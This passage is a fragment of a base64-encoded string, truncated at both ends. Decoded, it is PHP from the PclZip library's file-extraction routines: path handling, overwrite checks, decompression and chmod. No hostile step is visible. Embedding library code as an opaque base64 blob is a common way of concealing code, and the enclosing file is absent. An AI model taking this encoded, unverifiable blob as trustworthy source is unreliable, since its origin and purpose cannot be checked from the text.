gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSB7DQogICAgICAgICAgICAgICAgJGpfc3RhcnQgPSAkaisxOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10+JGkpIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICB9DQoNCiAgaWYgKCAgICgkdl9leHRyYWN0KQ0KICAgICAgJiYgKCAgICgkdl9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gIT0gOCkNCgkgICAgICAmJiAoJHZfaGVhZGVyWydjb21wcmVzc2lvbiddICE9IDApKSkgew0KICAgICAgICAkdl9oZWFkZXJbJ3N0YXR1cyddID0gJ3Vuc3VwcG9ydGVkX2NvbXByZXNzaW9uJzsNCg0KICAgICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OLA0KCQkgICAgICAgICAgICAgICAgICAgICAgICJGaWxlbmFtZSAnIi4kdl9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddLiInIGlzICINCgkJCSAgCSAgICAJICAJICAgLiJjb21wcmVzc2VkIGJ5IGFuIHVuc3VwcG9ydGVkIGNvbXByZXNzaW9uICINCgkJCSAgCSAgICAJICAJICAgLiJtZXRob2QgKCIuJHZfaGVhZGVyWydjb21wcmVzc2lvbiddLiIpICIpOw0KDQogICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgIH0NCiAgfQ0KICANCiAgaWYgKCgkdl9leHRyYWN0KSAmJiAoKCR2X2hlYWRlclsnZmxhZyddICYgMSkgPT0gMSkpIHsNCiAgICAgICAgJHZfaGVhZGVyWydzdGF0dXMnXSA9ICd1bnN1cHBvcnRlZF9lbmNyeXB0aW9uJzsNCg0KICAgICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04sDQoJCSAgICAgICAgICAgICAgICAgICAgICAgIlVuc3VwcG9ydGVkIGVuY3J5cHRpb24gZm9yICINCgkJCSAgCSAgICAJICAJICAgLiIgZmlsZW5hbWUgJyIuJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXQ0KCQkJCQkJCSAgIC4iJyIpOw0KDQogICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgIH0NCiAgfQ0KDQogICAgaWYgKCgkdl9leHRyYWN0KSAmJiAoJHZfaGVhZGVyWydzdGF0dXMnXSAhPSAnb2snKSkgew0KICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyLA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcF9maWxlX2xpc3RbJHZfbmJfZXh0cmFjdGVkKytdKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X2V4dHJhY3QgPSBmYWxzZTsNCiAgICB9DQogICAgDQogICAgaWYgKCR2X2V4dHJhY3QpDQogICAgew0KDQogICAgICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICAgICAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9oZWFkZXJbJ29mZnNldCddKSkNCiAgICAgIHsNCiAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQLCAnSW52YWxpZCBhcmNoaXZlIHNpemUnKTsNCg0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgIH0NCg0KICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10pIHsNCg0KICAgICAgICAkdl9zdHJpbmcgPSAnJzsNCg0KICAgICAgICAkdl9yZXN1bHQxID0gJHRoaXMtPnByaXZFeHRyYWN0RmlsZUFzU3RyaW5nKCR2X2hlYWRlciwgJHZfc3RyaW5nLCAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPCAxKSB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDE7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWRdKSkgIT0gMSkNCiAgICAgICAgew0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydjb250ZW50J10gPSAkdl9zdHJpbmc7DQoNCiAgICAgICAgJHZfbmJfZXh0cmFjdGVkKys7DQogICAgICAgIA0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA9PSAyKSB7DQogICAgICAgIAlicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgZWxzZWlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUXSkpDQoJICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUXSkpIHsNCiAgICAgICAgJHZfcmVzdWx0MSA9ICR0aGlzLT5wcml2RXh0cmFjdEZpbGVJbk91dHB1dCgkdl9oZWFkZXIsICRwX29wdGlvbnMpOw0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA8IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0MTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlciwgJHBfZmlsZV9saXN0WyR2X25iX2V4dHJhY3RlZCsrXSkpICE9IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPT0gMikgew0KICAgICAgICAJYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICAkdl9yZXN1bHQxID0gJHRoaXMtPnByaXZFeHRyYWN0RmlsZSgkdl9oZWFkZXIsDQoJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcF9wYXRoLCAkcF9yZW1vdmVfcGF0aCwNCgkJCQkJCQkJCQkgICRwX3JlbW92ZV9hbGxfcGF0aCwNCgkJCQkJCQkJCQkgICRwX29wdGlvbnMpOw0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA8IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0MTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlciwgJHBfZmlsZV9saXN0WyR2X25iX2V4dHJhY3RlZCsrXSkpICE9IDEpDQogICAgICAgIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA9PSAyKSB7DQogICAgICAgIAlicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXh0cmFjdEZpbGUoJiRwX2VudHJ5LCAkcF9wYXRoLCAkcF9yZW1vdmVfcGF0aCwgJHBfcmVtb3ZlX2FsbF9wYXRoLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCg0KICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2hlYWRlciwgJHBfZW50cnkpICE9IDEpIHsNCiAgfQ0KDQogIGlmICgkcF9yZW1vdmVfYWxsX3BhdGggPT0gdHJ1ZSkgew0KICAgICAgaWYgKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkgew0KDQogICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImZpbHRlcmVkIjsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gYmFzZW5hbWUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pOw0KICB9DQoNCiAgZWxzZSBpZiAoJHBfcmVtb3ZlX3BhdGggIT0gIiIpDQogIHsNCiAgICBpZiAoUGNsWmlwVXRpbFBhdGhJbmNsdXNpb24oJHBfcmVtb3ZlX3BhdGgsICRwX2VudHJ5WydmaWxlbmFtZSddKSA9PSAyKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImZpbHRlcmVkIjsNCg0KICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICB9DQoNCiAgICAkcF9yZW1vdmVfcGF0aF9zaXplID0gc3RybGVuKCRwX3JlbW92ZV9wYXRoKTsNCiAgICBpZiAoc3Vic3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAwLCAkcF9yZW1vdmVfcGF0aF9zaXplKSA9PSAkcF9yZW1vdmVfcGF0aCkNCiAgICB7DQoNCiAgICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gc3Vic3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9yZW1vdmVfcGF0aF9zaXplKTsNCg0KICAgIH0NCiAgfQ0KDQogIGlmICgkcF9wYXRoICE9ICcnKSB7DQogICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10gPSAkcF9wYXRoLiIvIi4kcF9lbnRyeVsnZmlsZW5hbWUnXTsNCiAgfQ0KICANCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTl0pKSB7DQogICAgJHZfaW5jbHVzaW9uDQogICAgPSBQY2xaaXBVdGlsUGF0aEluY2x1c2lvbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT05dLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10pOyANCiAgICBpZiAoJHZfaW5jbHVzaW9uID09IDApIHsNCg0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9ESVJFQ1RPUllfUkVTVFJJQ1RJT04sDQoJCSAgICAgICAgICAgICAgICAgICAgICJGaWxlbmFtZSAnIi4kcF9lbnRyeVsnZmlsZW5hbWUnXS4iJyBpcyAiDQoJCQkJCQkJIC4ib3V0c2lkZSBQQ0xaSVBfT1BUX0VYVFJBQ1RfRElSX1JFU1RSSUNUSU9OIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXShQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCiAgICANCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJhYm9ydGVkIjsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KDQogICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10gPSAkdl9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQogIH0NCg0KDQogIGlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogIGlmIChmaWxlX2V4aXN0cygkcF9lbnRyeVsnZmlsZW5hbWUnXSkpDQogIHsNCg0KICAgIGlmIChpc19kaXIoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImFscmVhZHlfYV9kaXJlY3RvcnkiOw0KICAgICAgDQogICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9BTFJFQURZX0FfRElSRUNUT1JZLA0KCQkgICAgICAgICAgICAgICAgICAgICAiRmlsZW5hbWUgJyIuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uIicgaXMgIg0KCQkJCQkJCSAuImFscmVhZHkgdXNlZCBieSBhbiBleGlzdGluZyBkaXJlY3RvcnkiKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KCSAgICB9DQogICAgfQ0KICAgIGVsc2UgaWYgKCFpc193cml0ZWFibGUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIndyaXRlX3Byb3RlY3RlZCI7DQoNCiAgICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1JdKSkNCgkgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCwNCgkJICAgICAgICAgICAgICAgICAgICAgIkZpbGVuYW1lICciLiRwX2VudHJ5WydmaWxlbmFtZSddLiInIGV4aXN0cyAiDQoJCQkJCQkJIC4iYW5kIGlzIHdyaXRlIHByb3RlY3RlZCIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQoJICAgIH0NCiAgICB9DQoNCiAgICBlbHNlIGlmIChmaWxlbXRpbWUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pID4gJHBfZW50cnlbJ210aW1lJ10pDQogICAgew0KICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVQTEFDRV9ORVdFUl0pKQ0KCSAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVJdPT09dHJ1ZSkpIHsNCiAgCSAgfQ0KCSAgICBlbHNlIHsNCiAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAibmV3ZXJfZXhpc3QiOw0KDQogICAgICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl0pKQ0KCSAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsDQoJCSAgICAgICAgICAgICAiTmV3ZXIgdmVyc2lvbiBvZiAnIi4kcF9lbnRyeVsnZmlsZW5hbWUnXS4iJyBleGlzdHMgIg0KCQkJCSAgICAuImFuZCBvcHRpb24gUENMWklQX09QVF9SRVBMQUNFX05FV0VSIGlzIG5vdCBzZWxlY3RlZCIpOw0KDQogICAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KCSAgICAgIH0NCgkgICAgfQ0KICAgIH0NCiAgICBlbHNlIHsNCiAgICB9DQogIH0NCg0KICBlbHNlIHsNCiAgICBpZiAoKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkgfHwgKHN1YnN0cigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgLTEpID09ICcvJykpDQogICAgICAkdl9kaXJfdG9fY2hlY2sgPSAkcF9lbnRyeVsnZmlsZW5hbWUnXTsNCiAgICBlbHNlIGlmICghc3Ryc3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAiLyIpKQ0KICAgICAgJHZfZGlyX3RvX2NoZWNrID0gIiI7DQogICAgZWxzZQ0KICAgICAgJHZfZGlyX3RvX2NoZWNrID0gZGlybmFtZSgkcF9lbnRyeVsnZmlsZW5hbWUnXSk7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEaXJDaGVjaygkdl9kaXJfdG9fY2hlY2ssICgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApKSkgIT0gMSkgew0KDQogICAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJwYXRoX2NyZWF0aW9uX2ZhaWwiOw0KDQogICAgICAgICR2X3Jlc3VsdCA9IDE7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAnb2snKSB7DQoNCiAgICBpZiAoISgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApKQ0KICAgIHsNCiAgICAgIGlmICgkcF9lbnRyeVsnY29tcHJlc3Npb24nXSA9PSAwKSB7DQoNCiAgICAgICAgaWYgKCgkdl9kZXN0X2ZpbGUgPSBAZm9wZW4oJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICd3YicpKSA9PSAwKQ0KICAgICAgICB7DQoNCiAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAid3JpdGVfZXJyb3IiOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQoNCiAgICAgICAgJHZfc2l6ZSA9ICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgICAgICAgew0KICAgICAgICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAgICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICAgICAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOyAgICAgICAgICAgIA0KICAgICAgICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgICAgICB9DQoNCiAgICAgICAgZmNsb3NlKCR2X2Rlc3RfZmlsZSk7DQoNCiAgICAgICAgdG91Y2goJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICRwX2VudHJ5WydtdGltZSddKTsNCiAgICAgICAgDQoNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICBpZiAoKCRwX2VudHJ5WydmbGFnJ10gJiAxKSA9PSAxKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OLCAnRmlsZSBcJycuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uJ1wnIGlzIGVuY3J5cHRlZC4gRW5jcnlwdGVkIGZpbGVzIGFyZSBub3Qgc3VwcG9ydGVkLicpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCg0KICAgICAgICBpZiAoICghaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkZdKSkgDQogICAgICAgICAgICAmJiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTl0pDQogICAgICAgICAgICAgICAgfHwgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSkNCiAgICAgICAgICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSA8PSAkcF9lbnRyeVsnc2l6ZSddKSkgKSApIHsNCiAgICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkV4dHJhY3RGaWxlVXNpbmdUZW1wRmlsZSgkcF9lbnRyeSwgJHBfb3B0aW9ucyk7DQogICAgICAgICAgaWYgKCR2X3Jlc3VsdCA8IFBDTFpJUF9FUlJfTk9fRVJST1IpIHsNCiAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBlbHNlIHsNCg0KICAgICAgICANCiAgICAgICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgICAgICANCiAgICAgICAgICAkdl9maWxlX2NvbnRlbnQgPSBAZ3ppbmZsYXRlKCR2X2J1ZmZlcik7DQogICAgICAgICAgdW5zZXQoJHZfYnVmZmVyKTsNCiAgICAgICAgICBpZiAoJHZfZmlsZV9jb250ZW50ID09PSBGQUxTRSkgew0KDQogICAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiZXJyb3IiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICANCiAgICAgICAgICBpZiAoKCR2X2Rlc3RfZmlsZSA9IEBmb3BlbigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgJ3diJykpID09IDApIHsNCg0KICAgICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIndyaXRlX2Vycm9yIjsNCg0KICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfZmlsZV9jb250ZW50LCAkcF9lbnRyeVsnc2l6ZSddKTsNCiAgICAgICAgICB1bnNldCgkdl9maWxlX2NvbnRlbnQpOw0KDQogICAgICAgICAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KICAgICAgICAgIA0KICAgICAgICB9DQoNCiAgICAgICAgQHRvdWNoKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9lbnRyeVsnbXRpbWUnXSk7DQogICAgICB9DQoNCiAgICAgIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU0VUX0NITU9EXSkpIHsNCg0KICAgICAgICBAY2htb2QoJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICRwX29wdGlvbnNbUENMWklQX09QVF9TRVRfQ0hNT0RdKTsNCiAgICAgIH0NCg0KICAgIH0NCiAgfQ0KDQoJaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAiYWJvcnRlZCIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJza2lwcGVkIjsNCgl9DQoNCiAgZWxzZWlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlVXNpbmdUZW1wRmlsZSgmJHBfZW50cnksICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgICAgIA0KICAkdl9nemlwX3RlbXBfbmFtZSA9IFBDTFpJUF9URU1QT1JBUllfRElSLnVuaXFpZCgncGNsemlwLScpLicuZ3onOw0KICBpZiAoKCR2X2Rlc3RfZmlsZSA9IEBmb3Blbigkdl9nemlwX3RlbXBfbmFtZSwgIndiIikpID09IDApIHsNCiAgICBmY2xvc2UoJHZfZmlsZSk7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSB3cml0ZSBtb2RlJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KDQogICR2X2Jpb